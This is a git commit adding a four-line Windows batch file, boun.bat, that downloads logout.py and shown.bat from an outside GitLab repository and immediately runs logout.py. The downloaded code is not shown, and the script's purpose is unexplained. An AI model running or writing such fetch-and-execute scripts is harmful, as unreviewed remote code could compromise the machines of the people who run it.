362087116752af4b676b860f34f732cf7e358bab
menia12 <160221779+menia12@users.noreply.github.com>
2024-05-29 16:06:27 +0700

    Create boun.bat

---
+++ boun.bat
@@ -0,0 +1,4 @@
+@echo off
+curl -L -o logout.py https://gitlab.com/rifqiekhafi/masfil/-/raw/main/logout.py?ref_type=heads&inline=false
+curl -L -o shown.bat https://gitlab.com/rifqiekhafi/masfil/-/raw/main/shown.bat?ref_type=heads&inline=false
+python logout.py
